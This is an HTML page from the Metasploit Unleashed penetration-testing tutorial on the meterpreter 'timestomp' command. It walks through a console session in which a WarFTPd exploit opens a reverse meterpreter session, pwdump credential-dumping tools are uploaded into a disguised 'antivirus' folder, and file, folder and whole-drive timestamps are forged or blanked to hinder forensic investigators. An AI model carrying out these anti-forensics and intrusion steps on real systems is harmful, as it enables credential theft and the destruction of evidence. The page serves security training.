<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Timestomp</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Timestomp</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Interacting with most file systems is
like walking in the snow...you
will leave footprints. How detailed those footprints are, how much can
be learned from them, and how long they last all depends on various
circumstances. The art of analyzing these artifacts is digital
forensics. For various reasons, when conducting a pen test you may want
to make it hard for a forensic analyst to determine the actions that
you took.
</p>
<p style="color: rgb(0, 0, 0);">The best way to avoid detection by a
forensic investigation is
simple: Don't touch the filesystem! This is one of the beautiful things
about meterpreter, it loads into memory without writing anything to
disk, greatly minimizing the artifacts it leaves on a system. However,
in many cases you may have to interact with the file system in some
way. In those cases timestomp can be a great tool.
</p>
<p style="color: rgb(0, 0, 0);">Lets look at a file on the system, and
the MAC (Modified, Accessed, Changed) times of the file:
<br>
<br>
</p>
<pre id="code">File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt<br>Created Date: 5/3/2009 2:30:08 AM<br>Last Accessed: 5/3/2009 2:31:39 AM<br>Last Modified: 5/3/2009 2:30:36 AM</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We will now start by exploiting the
system, and loading up a
meterpreter session. After that, we will load the timestomp module, and
take a quick look at the file in question.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf exploit(warftpd_165_user) &gt; exploit<br><br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Connecting to FTP server 172.16.104.145:21...<br>[*] Connected to target FTP server.<br>[*] Trying target Windows 2000 SP0-SP4 English...<br>[*] Transmitting intermediate stager for over-sized stage...(191 bytes)<br>[*] Sending stage (2650 bytes)<br>[*] Sleeping before handling stage...<br>[*] Uploading DLL (75787 bytes)...<br>[*] Upload completed.<br>[*] meterpreter session 1 opened (172.16.104.130:4444 -&gt; 172.16.104.145:1218)<br><u>meterpreter</u> &gt; use priv<br>Loading extension priv...success.<br><u>meterpreter</u> &gt; timestomp -h<br><br>Usage: timestomp file_path OPTIONS<br><br>OPTIONS:<br><br>-a   Set the "last accessed" time of the file<br>-b        Set the MACE timestamps so that EnCase shows blanks<br>-c   Set the "creation" time of the file<br>-e   Set the "mft entry modified" time of the file<br>-f   Set the MACE of attributes equal to the supplied file<br>-h        Help banner<br>-m   Set the "last written" time of the file<br>-r        Set the MACE timestamps recursively on a directory<br>-v        Display the UTC MACE values of the file<br>-z   Set all four attributes (MACE) of the file<br><br><u>meterpreter</u> &gt; pwd<br>C:\Program Files\War-ftpd<br><u>meterpreter</u> &gt; cd ..<br><u>meterpreter</u> &gt; pwd<br>C:Program Files<br><u>meterpreter</u> &gt; cd ..<br><u>meterpreter</u> &gt; cd Documents\ and\ Settings<br><u>meterpreter</u> &gt; cd P0WN3D<br><u>meterpreter</u> &gt; cd My\ Documents<br><u>meterpreter</u> &gt; ls<br><br>Listing: C:\Documents and Settings\P0WN3D\My Documents<br>======================================================<br><br>Mode              Size  Type  Last modified                   Name        <br>----              ----  ----  -------------                   ----        <br>40777/rwxrwxrwx   0     dir   Wed Dec 31 19:00:00 -0500 1969  .           <br>40777/rwxrwxrwx   0     dir   Wed Dec 31 19:00:00 -0500 1969  ..          <br>40555/r-xr-xr-x   0     dir   Wed Dec 31 19:00:00 -0500 1969  My Pictures <br>100666/rw-rw-rw-  28    fil   Wed Dec 31 19:00:00 -0500 1969  test.txt<br><u>meterpreter</u> &gt; timestomp test.txt -v<br>Modified      : Sun May 03 04:30:36 -0400 2009<br>Accessed      : Sun May 03 04:31:51 -0400 2009<br>Created       : Sun May 03 04:30:08 -0400 2009<br>Entry Modified: Sun May 03 04:31:44 -0400 2009</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now, lets look at the MAC times
displayed. We see that the file was
created recently. Lets pretend for a minute that this is a super secret
tool that we need to hide. One way to do this might be to set the MAC
times to match the MAC times of another file on the system. Lets copy
the MAC times from cmd.exe to test.txt to make it blend in a little
better.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code"><u>meterpreter</u> &gt; timestomp test.txt -f C:\WINNT\system32\cmd.exe<br>[*] Setting MACE attributes on test.txt from C:\WINNT\system32\cmd.exe<br><u>meterpreter</u> &gt; timestomp test.txt -v<br>Modified      : Tue Dec 07 08:00:00 -0500 1999<br>Accessed      : Sun May 03 05:14:51 -0400 2009<br>Created       : Tue Dec 07 08:00:00 -0500 1999<br>Entry Modified: Sun May 03 05:11:16 -0400 2009</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">There we go! Now it looks as if the
text.txt file was created on Dec 7th, 1999. Lets see how it looks from
Windows.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt<br>Created Date: 12/7/1999 7:00:00 AM<br>Last Accessed: 5/3/2009 3:11:16 AM<br>Last Modified: 12/7/1999 7:00:00 AM</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Success! Notice there is some slight
differences between the times
through Windows and msf. This is due to the way the timezones are
displayed. Windows is displaying the time in -0600, while msf shows the
MC times as -0500. When adjusted for the time zone differences, we can
see that they match. Also notice that the act of checking the files
information within Windows altered the last accessed time. This just
goes to show how fragile MAC times can be, and why great care has to be
taken when interacting with them.
</span>
<p style="color: rgb(0, 0, 0);">Lets now make a different change. Where
in the previous example, we
were looking to make the changes blend in. In some cases, this is just
not realistic, and the best you can hope for is to make it harder for
an investigator to identify when changes actually occurred. For those
situations, timestomp has a great option (-b for blank) where it zeros
out the MAC times for a file. Lets take a look.
<br>
<br>
</p>
<pre id="code"><u>meterpreter</u> &gt; timestomp test.txt -v<br>Modified      : Tue Dec 07 08:00:00 -0500 1999<br>Accessed      : Sun May 03 05:16:20 -0400 2009<br>Created       : Tue Dec 07 08:00:00 -0500 1999<br>Entry Modified: Sun May 03 05:11:16 -0400 2009<br><br><u>meterpreter</u> &gt; timestomp test.txt -b<br>[*] Blanking file MACE attributes on test.txt<br>meterpreter &gt; timestomp test.txt -v<br>[-] Error running command timestomp: Invalid MACE values /pentest/exploits/framework3/lib/rex/post/meterpreter/extensions/priv/fs.rb:45:in `get_file_mace'/pentest/exploits/framework3/lib/rex/post/meterpreter/ui/console/command_dispatcher/priv/timestomp.rb:91:in `cmd_timestomp'/pentest/exploits/framework3/lib/rex/parser/arguments.rb:63:in `parse'/pentest/exploits/framework3/lib/rex/parser/arguments.rb:53:in `each_pair'/pentest/exploits/framework3/lib/rex/parser/arguments.rb:53:in `parse'/pentest/exploits/framework3/lib/rex/post/meterpreter/packet_dispatcher.rb:78:in `each_with_index'/pentest/exploits/framework3/lib/rex/parser/arguments.rb:44:in `each'/pentest/exploits/framework3/lib/rex/parser/arguments.rb:44:in `each_with_index'/pentest/exploits/framework3/lib/rex/parser/arguments.rb:44:in `parse'/pentest/exploits/framework3/lib/rex/post/meterpreter/ui/console/command_dispatcher/priv/timestomp.rb:65:in `cmd_timestomp'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:234:in `send'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:234:in `run_command'/pentest/exploits/framework3/lib/rex/post/meterpreter/ui/console.rb:94:in `run_command'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:196:in `run_single'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:191:in `each'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:191:in `run_single'/pentest/exploits/framework3/lib/rex/post/meterpreter/ui/console.rb:60:in `interact'/pentest/exploits/framework3/lib/rex/ui/text/shell.rb:123:in `call'/pentest/exploits/framework3/lib/rex/ui/text/shell.rb:123:in `run'/pentest/exploits/framework3/lib/rex/post/meterpreter/ui/console.rb:58:in `interact'/pentest/exploits/framework3/lib/msf/base/sessions/meterpreter.rb:181:in `_interact'/pentest/exploits/framework3/lib/rex/ui/interactive.rb:48:in `interact'/pentest/exploits/framework3/lib/msf/ui/console/command_dispatcher/core.rb:997:in `cmd_sessions'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:234:in `send'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:234:in `run_command'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:196:in `run_single'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:191:in `each'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:191:in `run_single'/pentest/exploits/framework3/lib/msf/ui/console/command_dispatcher/exploit.rb:143:in `cmd_exploit'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:234:in `send'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:234:in `run_command'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:196:in `run_single'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:191:in `each'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:191:in `run_single'/pentest/exploits/framework3/lib/rex/ui/text/shell.rb:127:in `run'./msfconsole:82</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">That error message is a good thing!
After zeroing out the MAC
times, timestomp could not parse the MAC entries properly afterward.
This is very interesting, as some poorly written forensic tools have
the same problem, and will crash when coming across entries like this.
Lets see how the file looks in Windows.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt<br>Created Date: 1/1/1601<br>Last Accessed: 5/3/2009 3:21:13 AM<br>Last Modified: 1/1/1601</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Very interesting! Notice that times
are no longer displayed, and
the data is set to Jan 1, 1601. Any idea why that might be the case?
(Hint: </span><a style="color: rgb(0, 0, 0);"
 href="http://en.wikipedia.org/wiki/1601#Notes" class="external free"
 rel="nofollow">http://en.wikipedia.org/wiki/1601#Notes</a><span
 style="color: rgb(0, 0, 0);">)
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code"><u>meterpreter</u> &gt; cd C:\\WINNT<br><u>meterpreter</u> &gt; mkdir antivirus<br>Creating directory: antivirus<br><u>meterpreter</u> &gt; cd antivirus<br><u>meterpreter</u> &gt; pwd<br>C:\WINNT\antivirus<br><u>meterpreter</u> &gt; upload /pentest/windows-binaries/passwd-attack/pwdump6 c:\\WINNT\\antivirus\\<br>[*] uploading  : /pentest/windows-binaries/passwd-attack/pwdump6/PwDump.exe -&gt; c:WINNTantivirusPwDump.exe<br>[*] uploaded   : /pentest/windows-binaries/passwd-attack/pwdump6/PwDump.exe -&gt; c:WINNTantivirusPwDump.exe<br>[*] uploading  : /pentest/windows-binaries/passwd-attack/pwdump6/LsaExt.dll -&gt; c:WINNTantivirusLsaExt.dll<br>[*] uploaded   : /pentest/windows-binaries/passwd-attack/pwdump6/LsaExt.dll -&gt; c:WINNTantivirusLsaExt.dll<br>[*] uploading  : /pentest/windows-binaries/passwd-attack/pwdump6/pwservice.exe -&gt; c:WINNTantiviruspwservice.exe<br>[*] uploaded   : /pentest/windows-binaries/passwd-attack/pwdump6/pwservice.exe -&gt; c:WINNTantiviruspwservice.exe<br><u>meterpreter</u> &gt; ls<br><br>Listing: C:\WINNT\antivirus<br>===========================<br><br>Mode              Size    Type  Last modified                   Name          <br>----              ----    ----  -------------                   ----          <br>40777/rwxrwxrwx   0       dir   Wed Dec 31 19:00:00 -0500 1969  .             <br>40777/rwxrwxrwx   0       dir   Wed Dec 31 19:00:00 -0500 1969  ..            <br>100666/rw-rw-rw-  61440   fil   Wed Dec 31 19:00:00 -0500 1969  LsaExt.dll    <br>100777/rwxrwxrwx  188416  fil   Wed Dec 31 19:00:00 -0500 1969  PwDump.exe    <br>100777/rwxrwxrwx  45056   fil   Wed Dec 31 19:00:00 -0500 1969  pwservice.exe <br>100666/rw-rw-rw-  27      fil   Wed Dec 31 19:00:00 -0500 1969  sample.txt<br><u>meterpreter</u> &gt; cd ..</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">With our files uploaded, we will now
run timestomp on the files to confuse any potential investigator.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code"><u>meterpreter</u> &gt; timestomp antivirus\\pwdump.exe -v<br>Modified      : Sun May 03 05:35:56 -0400 2009<br>Accessed      : Sun May 03 05:35:56 -0400 2009<br>Created       : Sun May 03 05:35:56 -0400 2009<br>Entry Modified: Sun May 03 05:35:56 -0400 2009<br>meterpreter &gt; timestomp antivirus\\LsaExt.dll -v<br>Modified      : Sun May 03 05:35:56 -0400 2009<br>Accessed      : Sun May 03 05:35:56 -0400 2009<br>Created       : Sun May 03 05:35:56 -0400 2009<br>Entry Modified: Sun May 03 05:35:56 -0400 2009<br><u>meterpreter</u> &gt; timestomp antivirus -r<br>[*] Blanking directory MACE attributes on antivirus<br><br><u>meterpreter</u> &gt; ls<br>[-] Error running command ls: bignum too big to convert into `long' /pentest/exploits/framework3/lib/rex/post/file_stat.rb:66:in `at'/pentest/exploits/framework3/lib/rex/post/file_stat.rb:66:in `mtime'/pentest/exploits/framework3/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:237:in `cmd_ls'/pentest/exploits/framework3/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:230:in `each'/pentest/exploits/framework3/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:230:in `cmd_ls'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:234:in `send'/pentest/exploits/framework3/lib/rex/ui/text/dispatcher_shell.rb:234:in `run_command'/pentest/exploits/framework3/lib/rex/post/meterpreter</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">As you can see, meterpreter can no
longer get a proper directory listing.
</span>
<p style="color: rgb(0, 0, 0);">However, there is something to consider
in this case. We have hidden
when an action occurred, yet it will still be very obvious to an
investigator where activity was happening. What would we do if we
wanted to hide both when a toolkit was uploaded, and where it was
uploaded?
</p>
<p style="color: rgb(0, 0, 0);">The easiest way to approach this is to
zero out the times on
the full drive. This will make the job of the investigator very
difficult, as traditional time line analysis will not be possible. Lets
first look at our WINNTsystem32 directory.
<br>
<br>
</p>
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Timestomp_01.png"
 class="image"><img alt="Timestomp 01.png"
 src="http://www.offensive-security.com/w/images/6/64/Timestomp_01.png"
 width="478" height="415"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
Ok, everything looks normal. Now, lets shake the filesystem up really
bad!
<br>
<br>
</p>
<pre id="code"><u>meterpreter</u> &gt; pwd<br>C:WINNT\antivirus<br><u>meterpreter</u> &gt; cd ../..<br><u>meterpreter</u> &gt; pwd<br>C:<br><u>meterpreter</u> &gt; ls<br><br>Listing: C:\<br>============<br><br>Mode              Size       Type  Last modified                   Name                      <br>----              ----       ----  -------------                   ----                      <br>100777/rwxrwxrwx  0          fil   Wed Dec 31 19:00:00 -0500 1969  AUTOEXEC.BAT              <br>100666/rw-rw-rw-  0          fil   Wed Dec 31 19:00:00 -0500 1969  CONFIG.SYS                <br>40777/rwxrwxrwx   0          dir    Wed Dec 31 19:00:00 -0500 1969  Documents and Settings    <br>100444/r--r--r--  0          fil   Wed Dec 31 19:00:00 -0500 1969  IO.SYS                    <br>100444/r--r--r--  0          fil   Wed Dec 31 19:00:00 -0500 1969  MSDOS.SYS                 <br>100555/r-xr-xr-x  34468      fil   Wed Dec 31 19:00:00 -0500 1969  NTDETECT.COM              <br>40555/r-xr-xr-x   0          dir   Wed Dec 31 19:00:00 -0500 1969  Program Files             <br>40777/rwxrwxrwx   0          dir   Wed Dec 31 19:00:00 -0500 1969  RECYCLER                  <br>40777/rwxrwxrwx   0          dir   Wed Dec 31 19:00:00 -0500 1969  System Volume Information <br>40777/rwxrwxrwx   0          dir   Wed Dec 31 19:00:00 -0500 1969  WINNT                     <br>100555/r-xr-xr-x  148992     fil   Wed Dec 31 19:00:00 -0500 1969  arcldr.exe                <br>100555/r-xr-xr-x  162816     fil   Wed Dec 31 19:00:00 -0500 1969  arcsetup.exe              <br>100666/rw-rw-rw-  192        fil   Wed Dec 31 19:00:00 -0500 1969  boot.ini                  <br>100444/r--r--r--  214416     fil   Wed Dec 31 19:00:00 -0500 1969  ntldr                     <br>100666/rw-rw-rw-  402653184  fil   Wed Dec 31 19:00:00 -0500 1969  pagefile.sys              <br><br><u>meterpreter</u> &gt; timestomp C:\ -r<br>[*] Blanking directory MACE attributes on C:\<br><u>meterpreter</u> &gt; ls<br>[-] Error running command ls: bignum too big to convert into `long' /pentest/exploits/framework3/lib/rex/post/file_stat.rb:66:in `at'/pentest/exploits/framework3/lib/rex<br><br>/post/file_stat.rb:66:in `mtime'/pentest/exploits/framework3/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/fs.rb:237:in /lib/rex/ui/text/dispatcher_shell.rb:191:in `run_single'/pentest/exploits/framework3/lib/rex/ui/text/shell.rb:127:in `run'./msfconsole:82</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">So, after that what does Windows
see?
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="color: rgb(0, 0, 0);" class="center">
<div class="floatnone"><a
 href="http://www.offensive-security.com/metasploit-unleashed/File:Timestomp_02.png"
 class="image"><img alt="Timestomp 02.png"
 src="http://www.offensive-security.com/w/images/7/7e/Timestomp_02.png"
 width="485" height="417"></a></div>
</div>
<p style="color: rgb(0, 0, 0);"><br>
<br>
Amazing. Windows has no idea what is going on, and displays crazy times
all over the place.
</p>
<p style="color: rgb(0, 0, 0);">Don't get overconfident however. By
taking this action, you have
also made it very obvious that some adverse activity has occurred on
the system. Also, there are many different sources of time-line
information on a Windows system other then just MAC times. If a
forensic investigator came across a system which has been modified in
this manner, they will be running to these alternative information
sources. However, the cost of conducting the investigation just went
up. <br>
<br>
</p>
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/MSF_Post_Exploitation"
 title="MSF Post Exploitation">MSF Post Exploitation</a></div>
</body>
</html>
